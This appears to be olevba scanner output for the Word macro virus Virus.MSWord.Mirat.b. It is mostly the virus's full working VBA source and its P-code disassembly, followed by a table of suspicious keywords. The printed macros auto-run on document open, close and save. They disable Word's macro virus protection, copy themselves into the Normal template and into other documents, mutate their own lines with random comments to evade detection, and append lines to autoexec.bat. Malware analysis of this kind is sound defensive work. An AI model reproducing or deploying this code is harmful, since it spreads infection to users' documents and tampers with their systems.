olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fUY.bas 
in file: Virus.MSWord.Mirat.b - OLE stream: 'Macros/VBA/fUY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'PolyMorphing Viruz by MI_pirat
'CodeNAME: Kewl--NOT!
On Error Resume Next
StatusBar = "<< Kewl lives somewhere in HERE >>"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") <> "Kaka" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") = "Kaka"
Options.VirusProtection = (2 Xor 2)
Dim nr, xxx, nume
nume = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32))
ActiveDocument.VBProject.VBComponents(2).Name = nume
nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
For i = 1 To nr
xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1)
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strn = xxx + " '" + poly
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn
Next i
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
'Some publicity doesn't hurt anyone
Open "C:\autoexec.bat" For Append As #1
Print #1, "@echo off"
Print #1, "echo MI_pirat"
Print #1, "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy"
Print #1, "echo."
Close #1
End If
End Sub
Sub AutoClose()
'Errr.. spead me
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !"
Dim nume, myTemplate
myTemplate = NormalTemplate
nume = NormalTemplate.VBProject.VBComponents(2).Name
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Inf" Then num = aVar.Index
Next aVar
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then
ActiveDocument.Variables.Add Name:="Inf"
ActiveDocument.Variables("Inf").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
Sub AutoSave()
'Sure...Hehe infect it everytime
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !"
On Error Resume Next
Dim nume, myTemplate
myTemplate = NormalTemplate
nume = NormalTemplate.VBProject.VBComponents(2).Name
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Inf" Then num = aVar.Index
Next aVar
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then
ActiveDocument.Variables.Add Name:="Inf"
ActiveDocument.Variables("Inf").Value = 1
Set myTemplate = ActiveDocument.AttachedTemplate
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mirat.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/fUY - 10531 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x001E "PolyMorphing Viruz by MI_pirat"
' Line #2:
' 	QuoteRem 0x0000 0x0014 "CodeNAME: Kewl--NOT!"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitStr 0x0022 "<< Kewl lives somewhere in HERE >>"
' 	St StatusBar 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "Kewl"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0004 "Kaka"
' 	Ne 
' 	IfBlock 
' Line #6:
' 	LitStr 0x0004 "Kaka"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "Kewl"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Xor 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	Dim 
' 	VarDefn nr
' 	VarDefn xxx
' 	VarDefn nume
' Line #9:
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St nume 
' Line #10:
' 	Ld nume 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #11:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nr 
' Line #12:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set myTemplate 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nume 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nr 
' 	For 
' Line #15:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St xxx 
' Line #16:
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St poly 
' Line #17:
' 	Ld xxx 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld poly 
' 	Add 
' 	St strn 
' Line #18:
' 	Ld i 
' 	Ld strn 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #21:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #22:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #23:
' 	QuoteRem 0x0000 0x0022 "Some publicity doesn't hurt anyone"
' Line #24:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "echo MI_pirat"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub AutoClose())
' Line #33:
' 	QuoteRem 0x0000 0x000F "Errr.. spead me"
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #36:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x000A 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Are U havn' phun ?"
' 	Ld vbYesNo 
' 	LitStr 0x001D "Kewl has spead considerably !"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #37:
' 	Dim 
' 	VarDefn nume
' 	VarDefn myTemplate
' Line #38:
' 	Ld NormalTemplate 
' 	St myTemplate 
' Line #39:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nume 
' Line #40:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' Line #41:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0003 "Inf"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' Line #42:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #44:
' 	LitStr 0x0003 "Inf"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0001 
' Line #45:
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "Inf"
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' Line #46:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set myTemplate 
' Line #47:
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nume 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub AutoSave())
' Line #52:
' 	QuoteRem 0x0000 0x001F "Sure...Hehe infect it everytime"
' Line #53:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #54:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x000A 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Are U havn' phun ?"
' 	Ld vbYesNo 
' 	LitStr 0x001D "Kewl has spead considerably !"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	Dim 
' 	VarDefn nume
' 	VarDefn myTemplate
' Line #57:
' 	Ld NormalTemplate 
' 	St myTemplate 
' Line #58:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nume 
' Line #59:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' Line #60:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0003 "Inf"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' Line #61:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #63:
' 	LitStr 0x0003 "Inf"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0001 
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "Inf"
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' Line #65:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set myTemplate 
' Line #66:
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nume 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #67:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

